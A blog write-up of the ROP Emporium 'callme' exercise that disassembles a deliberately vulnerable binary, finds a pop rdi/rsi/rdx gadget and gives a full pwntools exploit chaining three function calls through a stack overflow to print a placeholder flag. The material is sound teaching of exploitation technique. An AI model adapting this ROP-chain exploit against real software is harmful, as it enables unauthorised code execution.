---
layout:     post
title:      'ROP Emporium - callme'
date:       2019-01-30 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'ROP Emporium'
---

In this challenge from Rop Emporium, we're going to learn how to set up function arguments using gadgets and chain different calls to function in order to get correct result. If you've completed previous challenges `ret2win` and `split`, this challenge shouldn't be any harder, you just have to use previous knowledge and some logic in order to get to the flag.

Starting with our usual checklist, we can see that it's an ELF binary with `NX` bit set. 

```text
[w3ndige@main callme]$ rabin2 -I callme 
arch     x86
baddr    0x400000
binsz    11375
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    ./
static   false
stripped false
subsys   linux
va       true
```

Now we can head into actaully disassembling the binary, and as always, let's view the functions with `radare` and then analyze each one in order to get the understanding of the flow. 

```text
[w3ndige@main callme]$ r2 -AAA callme 
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
 -- Use zoom.byte=entropy and press 'z' in visual mode to zoom out to see the entropy of the whole file
[0x004018a0]> afl
0x004017c0    3 26           sym._init
0x004017f0    1 6            sym.imp.puts
0x00401800    1 6            sym.imp.printf
0x00401810    1 6            sym.imp.callme_three
0x00401820    1 6            sym.imp.memset
0x00401830    1 6            sym.imp.__libc_start_main
0x00401840    1 6            sym.imp.fgets
0x00401850    1 6            sym.imp.callme_one
0x00401860    1 6            sym.imp.setvbuf
0x00401870    1 6            sym.imp.callme_two
0x00401880    1 6            sym.imp.exit
0x00401890    1 6            sub.__gmon_start_401890
0x004018a0    1 41           entry0
0x004018d0    4 50   -> 41   sym.deregister_tm_clones
0x00401910    4 58   -> 55   sym.register_tm_clones
0x00401950    3 28           sym.__do_global_dtors_aux
0x00401970    4 38   -> 35   entry.init0
0x00401996    1 111          sym.main
0x00401a05    1 82           sym.pwnme
0x00401a57    1 74           sym.usefulFunction
0x00401ac0    4 101          sym.__libc_csu_init
0x00401b30    1 2            sym.__libc_csu_fini
0x00401b34    1 9            sym._fini
```

Here we can see functions used in previous challenges - `main`, `pwnme` and `usefulFunction`. But in addition we have `callme_one`, `callme_two` and `callme_three`. From challenge description, we know that in order to get the flag, we have to call them in correct orders with correct parameters - function `callme_one(1, 2, 3)`, `callme_two(1, 2, 3)` and `callme_three(1, 2, 3)`. Earch of them have the same parameters.

Before we inspect them, let's take a quick look at `main`. 

```text
[0x004018a0]> pdf @main
            ;-- main:
/ (fcn) sym.main 111
|   sym.main (int argc, char **argv, char **envp);
|           ; DATA XREF from entry0 (0x4018bd)
|           0x00401996      55             push rbp
|           0x00401997      4889e5         mov rbp, rsp
|           0x0040199a      488b05df0620.  mov rax, qword [obj.stdout__GLIBC_2.2.5] ; [0x602080:8]=0
|           0x004019a1      b900000000     mov ecx, 0
|           0x004019a6      ba02000000     mov edx, 2
|           0x004019ab      be00000000     mov esi, 0
|           0x004019b0      4889c7         mov rdi, rax
|           0x004019b3      e8a8feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x004019b8      488b05e10620.  mov rax, qword [obj.stderr__GLIBC_2.2.5] ; [0x6020a0:8]=0
|           0x004019bf      b900000000     mov ecx, 0
|           0x004019c4      ba02000000     mov edx, 2
|           0x004019c9      be00000000     mov esi, 0
|           0x004019ce      4889c7         mov rdi, rax
|           0x004019d1      e88afeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x004019d6      bf481b4000     mov edi, str.callme_by_ROP_Emporium ; 0x401b48 ; "callme by ROP Emporium"
|           0x004019db      e810feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004019e0      bf5f1b4000     mov edi, str.64bits         ; 0x401b5f ; "64bits\n"
|           0x004019e5      e806feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004019ea      b800000000     mov eax, 0
|           0x004019ef      e811000000     call sym.pwnme
|           0x004019f4      bf671b4000     mov edi, str.Exiting        ; 0x401b67 ; "\nExiting"
|           0x004019f9      e8f2fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004019fe      b800000000     mov eax, 0
|           0x00401a03      5d             pop rbp
\           0x00401a04      c3             ret
```

Here, once again we have a call to `pwnme` function. We can analyze it, to see whether the size of the buffer did not change. 

```text
0x004018a0]> pdf @sym.pwnme
/ (fcn) sym.pwnme 82
|   sym.pwnme ();
|           ; var int local_20h @ rbp-0x20
|           ; CALL XREF from sym.main (0x4019ef)
|           0x00401a05      55             push rbp
|           0x00401a06      4889e5         mov rbp, rsp
|           0x00401a09      4883ec20       sub rsp, 0x20
|           0x00401a0d      488d45e0       lea rax, qword [local_20h]
|           0x00401a11      ba20000000     mov edx, 0x20               ; 32
|           0x00401a16      be00000000     mov esi, 0
|           0x00401a1b      4889c7         mov rdi, rax
|           0x00401a1e      e8fdfdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x00401a23      bf701b4000     mov edi, str.Hope_you_read_the_instructions... ; 0x401b70 ; "Hope you read the instructions..."
|           0x00401a28      e8c3fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00401a2d      bf921b4000     mov edi, 0x401b92
|           0x00401a32      b800000000     mov eax, 0
|           0x00401a37      e8c4fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00401a3c      488b154d0620.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x602090:8]=0
|           0x00401a43      488d45e0       lea rax, qword [local_20h]
|           0x00401a47      be00010000     mov esi, 0x100              ; 256
|           0x00401a4c      4889c7         mov rdi, rax
|           0x00401a4f      e8ecfdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00401a54      90             nop
|           0x00401a55      c9             leave
\           0x00401a56      c3             ret
```

All the same, we have `32` byte buffer and `fgets` that will overflow the buffer. But what this time resides in `usefulFunction`? Let's see.

```text
[0x004018a0]> pdf @sym.usefulFunction
/ (fcn) sym.usefulFunction 74
|   sym.usefulFunction ();
|           0x00401a57      55             push rbp
|           0x00401a58      4889e5         mov rbp, rsp
|           0x00401a5b      ba06000000     mov edx, 6
|           0x00401a60      be05000000     mov esi, 5
|           0x00401a65      bf04000000     mov edi, 4
|           0x00401a6a      e8a1fdffff     call sym.imp.callme_three
|           0x00401a6f      ba06000000     mov edx, 6
|           0x00401a74      be05000000     mov esi, 5
|           0x00401a79      bf04000000     mov edi, 4
|           0x00401a7e      e8edfdffff     call sym.imp.callme_two
|           0x00401a83      ba06000000     mov edx, 6
|           0x00401a88      be05000000     mov esi, 5
|           0x00401a8d      bf04000000     mov edi, 4
|           0x00401a92      e8b9fdffff     call sym.imp.callme_one
|           0x00401a97      bf01000000     mov edi, 1
\           0x00401a9c      e8dffdffff     call sym.imp.exit           ; void exit(int status)
```

Great, we can learn from here how the parameters are passed to this functions. Notice, how parameters are passed in, in reverse order. Using [Compiler Explorer](https://godbolt.org/), we can see that indeed, that's how parameters are passed to the function. 

```c
int mul(int a, int b, int c) {
    return a * b * c;
}

int main() {
    int a = 1;
    int b = 2;
    int c = 3;
    int result = mul(1, 2, 3);
    return 0;
}
```

This snipped of code compiles into this assembly code. 

```assembly
mul(int, int, int):
        push    rbp
        mov     rbp, rsp
        mov     DWORD PTR [rbp-4], edi
        mov     DWORD PTR [rbp-8], esi
        mov     DWORD PTR [rbp-12], edx
        mov     eax, DWORD PTR [rbp-4]
        imul    eax, DWORD PTR [rbp-8]
        imul    eax, DWORD PTR [rbp-12]
        pop     rbp
        ret
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 16
        mov     DWORD PTR [rbp-4], 1
        mov     DWORD PTR [rbp-8], 2
        mov     DWORD PTR [rbp-12], 3
        mov     edx, 3
        mov     esi, 2
        mov     edi, 1
        call    mul(int, int, int)
        mov     DWORD PTR [rbp-16], eax
        mov     eax, 0
        leave
        ret
```

With that knowledge we can easily craft a payload to call these functions with proper arguments. Once again, I'll be using `pwntools` with `python2`, but this time we're going to write a proper exploit since using one liners will be pretty tedious. 

In order to get the values into registers used to passing the arguments, we'll need a gadget that will pop values from the stack into these registers. 

```text
[w3ndige@main callme]$ ropper --file callme --search 'pop %'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop %

[INFO] File: callme
0x0000000000401b1c: pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000401b1e: pop r13; pop r14; pop r15; ret; 
0x0000000000401b20: pop r14; pop r15; ret; 
0x0000000000401b22: pop r15; ret; 
0x00000000004018ef: pop rbp; mov edi, 0x602078; jmp rax; 
0x0000000000401b1b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000401b1f: pop rbp; pop r14; pop r15; ret; 
0x0000000000401900: pop rbp; ret; 
0x0000000000401ab0: pop rdi; pop rsi; pop rdx; ret; 
0x0000000000401b23: pop rdi; ret; 
0x0000000000401ab2: pop rdx; ret; 
0x0000000000401b21: pop rsi; pop r15; ret; 
0x0000000000401ab1: pop rsi; pop rdx; ret; 
0x0000000000401b1d: pop rsp; pop r13; pop r14; pop r15; ret; 
```

At address `0x0000000000401ab0` we have a great candidate that, with one gadget, will pop the values from the stack into these registers. Let's use it. 





```python2
from pwn import *

def add_arguments(payload):
    payload += p64(0x0000000000401ab0) # Address of gadget pop rdi; pop rsi; pop rdx; ret;
    payload += p64(0x1)
    payload += p64(0x2)
    payload += p64(0x3)
    return payload

offset = cyclic(40) # 40 bytes used to overflow.
payload = offset
payload = add_arguments(payload)
payload += p64(0x00401850) # Address of callme_one function.
payload = add_arguments(payload)
payload += p64(0x00401870) # Address of callme_two function.
payload = add_arguments(payload)
payload += p64(0x00401810) # Address of callme_three function.

sh = process('callme')
sh.recv()
sh.sendline(payload)
output = sh.recvall()
print(output)
```

And after executing it.

```text
[w3ndige@main callme]$ python2 exploit.py 
[!] Could not find executable 'callme' in $PATH, using './callme' instead
[+] Starting local process './callme': pid 3381
[+] Receiving all data: Done (32B)
[*] Process './callme' stopped with exit code 0 (pid 3381)
ROPE{a_placeholder_32byte_flag!}
```

We have a flag.